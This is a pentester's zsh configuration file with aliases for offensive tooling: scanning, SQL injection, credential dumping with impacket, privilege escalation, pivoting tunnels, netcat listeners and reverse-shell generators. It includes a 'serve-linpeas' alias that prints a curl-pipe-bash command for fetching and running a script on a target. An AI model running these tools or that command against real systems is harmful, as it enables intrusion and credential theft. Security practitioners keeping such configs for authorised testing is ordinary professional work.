# ============================================================
# .zshrc — toolkit v1.1
# Aliases, fonctions, prompt custom
# ============================================================

# ─── Environnement ──────────────────────────────────────────
export TOOLS="$HOME/tools"
export WORDLISTS="$HOME/wordlists"
export PATH="$PATH:$TOOLS:$HOME/go/bin:$HOME/.local/bin"

# ─── Prompt différencié root / user ─────────────────────────
if [ "$EUID" -eq 0 ]; then
    PROMPT='%F{red}[ROOT@%m]%f %F{yellow}%~%f %# '
else
    PROMPT='%F{green}[%n@%m]%f %F{cyan}%~%f %# '
fi

# ─── Options zsh ────────────────────────────────────────────
setopt AUTO_CD
setopt HIST_IGNORE_DUPS
HISTSIZE=10000
SAVEHIST=10000
HISTFILE=~/.zsh_history

# ─── Syntax highlighting (si installé) ──────────────────────
[ -f /usr/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh ] && \
    source /usr/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh

# ══════════════════════════════════════════════════════════════
# RECON
# ══════════════════════════════════════════════════════════════
alias nmap-quick='nmap -sV -sC -T4'
alias nmap-full='nmap -sV -sC -p-'
alias nmap-udp='nmap -sU -T4'
alias nmap-vuln='nmap --script vuln'
alias nmap-save='nmap -sV -sC -T4 -oA scan'

# ══════════════════════════════════════════════════════════════
# WEB
# ══════════════════════════════════════════════════════════════
alias ffuf-dir='ffuf -w $WORDLISTS/directories/medium.txt -u'
alias ffuf-sub='ffuf -w $WORDLISTS/subdomains/top5000.txt -H "Host: FUZZ.TARGET" -u'
alias gobuster-dir='gobuster dir -w $WORDLISTS/directories/common.txt -u'
alias xsstrike='python3 $TOOLS/xsstrike/xsstrike.py'
alias gopherus='python3 $TOOLS/gopherus/gopherus.py'
alias sqlmap='sqlmap --batch'

# ══════════════════════════════════════════════════════════════
# OSINT
# ══════════════════════════════════════════════════════════════
alias spiderfoot='python3 $TOOLS/spiderfoot/sf.py -l 127.0.0.1:5001'
alias photon='python3 $TOOLS/photon/photon.py'
alias datasploit='python3 $TOOLS/datasploit/datasploit.py'
alias holehe='python3 $TOOLS/holehe/holehe/main.py'
alias phoneinfroga='phoneinfoga scan -n'

# ══════════════════════════════════════════════════════════════
# POST-EXPLOITATION
# ══════════════════════════════════════════════════════════════
alias secretsdump='python3 $TOOLS/impacket/examples/secretsdump.py'
alias GetNPUsers='python3 $TOOLS/impacket/examples/GetNPUsers.py'
alias GetUserSPNs='python3 $TOOLS/impacket/examples/GetUserSPNs.py'
alias psexec='python3 $TOOLS/impacket/examples/psexec.py'
alias wmiexec='python3 $TOOLS/impacket/examples/wmiexec.py'
alias linpeas='bash $TOOLS/PEASS-ng/linPEAS/linpeas.sh'
alias winpeas='$TOOLS/PEASS-ng/winPEAS/winPEASx64.exe'
alias evil-winrm='evil-winrm'
alias cme='crackmapexec'

# PrivEsc Windows
alias godpotato='$TOOLS/GodPotato/GodPotato.exe'
alias printspoofer='$TOOLS/PrintSpoofer/PrintSpoofer64.exe'
alias juicypotato='$TOOLS/JuicyPotato/JuicyPotato.exe'

# ══════════════════════════════════════════════════════════════
# PIVOTING
# ══════════════════════════════════════════════════════════════
alias chisel-server='$TOOLS/chisel/chisel server -p 8080 --reverse'
alias chisel-client='$TOOLS/chisel/chisel client'
alias ligolo-proxy='$TOOLS/ligolo-ng/cmd/proxy/proxy -selfcert'
alias ligolo-agent='$TOOLS/ligolo-ng/cmd/agent/agent'

# ══════════════════════════════════════════════════════════════
# FORENSICS
# ══════════════════════════════════════════════════════════════
alias vol='python3 $TOOLS/volatility3/vol.py'

# ══════════════════════════════════════════════════════════════
# UTILS
# ══════════════════════════════════════════════════════════════
# Serveurs HTTP
alias serve='python3 -m http.server 8080'
alias serve-linpeas='cp $TOOLS/PEASS-ng/linPEAS/linpeas.sh /tmp/ && echo "[+] curl http://$(localip):8080/linpeas.sh | bash" && python3 -m http.server 8080 -d /tmp'
serve-tool() { echo "[+] Servir : http://$(localip):8080/$(basename "$1")"; python3 -m http.server 8080 -d "$(dirname "$1")"; }

# Listeners
alias listen='nc -lvnp'
alias pwncat-listen='python3 -m pwncat -lp'

# Workspace
target() {
    mkdir -p "$1"/{recon,web,exploit,loot,notes,re}
    echo "[+] Workspace créé : $1/{recon,web,exploit,loot,notes,re}"
    cd "$1"
}

# Réseau
alias myip='curl -s ifconfig.me'
alias localip='ip route get 1 | awk "{print \$7; exit}"'
quickscan() { mkdir -p recon && nmap -sV -sC -T4 "$1" -oA recon/nmap_quick && cat recon/nmap_quick.nmap; }
alias shell-old='rm ~/.zshrc && cp ~/.zshrc.bak ~/.zshrc && exec zsh'

# Encodage
alias b64e='base64 -w 0'
alias b64d='base64 -d'
urlencode() { python3 -c "import urllib.parse; print(urllib.parse.quote('$1'))"; }
urldecode() { python3 -c "import urllib.parse; print(urllib.parse.unquote('$1'))"; }

# Génération de reverse shells
alias revshells='$TOOLS/revshells/index.html'
alias revshell='bash $TOOLKIT_DIR/scripts/revshell.sh'

# Divers
alias ll='ls -la --color=auto'
alias ls='ls --color=auto'
alias grep='grep --color=auto'

# Navigation mot par mot avec Ctrl + Gauche/Droite
bindkey "^[[1;5C" forward-word
bindkey "^[[1;5D" backward-word

# ══════════════════════════════════════════════════════════════
# TOOLKIT PRO (optionnel — charge les alias si installé)
# ══════════════════════════════════════════════════════════════
[ -f ~/.toolkit-pro/aliases.zsh ] && source ~/.toolkit-pro/aliases.zsh


